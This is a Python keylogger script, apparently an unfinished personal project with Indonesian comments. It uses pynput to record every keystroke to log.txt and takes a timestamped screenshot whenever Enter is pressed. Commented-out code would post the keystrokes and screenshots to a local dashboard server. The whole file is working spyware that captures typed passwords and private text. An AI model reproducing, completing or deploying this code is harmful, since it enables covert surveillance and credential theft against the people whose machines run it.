import pynput
import pyautogui
import secrets
import requests
from datetime import datetime
from pynput.keyboard import Key, Listener

keys = []

# bagian request

session = requests.Session()
url = 'http://127.0.0.1:5000/dashboard'

# client_id = 1


def on_press(key):

    keys.append(key)
    write_file(keys)

    # bagian request
    # key_press = key.format()
    # keystroke = {
    #     "": "",
    #     "": ""

    # }
    # request.post(url, data=keystroke)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
        key_press = key.char
        # obj = {"time": "test", "data": key_press}
        # session.post(url, data=obj)
        # print(type(key_press))

    except AttributeError:
        print('special key {0} pressed'.format(key))
        key_press = str(key).replace('Key.', '')
        # obj = {"time": "test", "data": key_press}
        # session.post(url, data=obj)
        # print(key_press)

        if key == Key.enter:
            take_screenshot = pyautogui.screenshot()
            file_name = datetime.now().strftime("%d-%b-%Y %H.%M.%S") + '.jpg'
            take_screenshot.save(f'screenshot\\{file_name}')
            print(type(take_screenshot))
            #requests.post(url, files=take_screenshot)


def write_file(keys):

    with open('log.txt', 'w') as f:
        for key in keys:
            

            # removing ''
            q = str(key).replace("'", "")
            k = str(q).replace('Key.', '')

            f.write(k)

            # explicitly adding a space after
            # every keystroke for readability
            f.write(' ')


def on_release(key):

    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False


with Listener(on_press=on_press,
              on_release=on_release) as listener:

    listener.join()
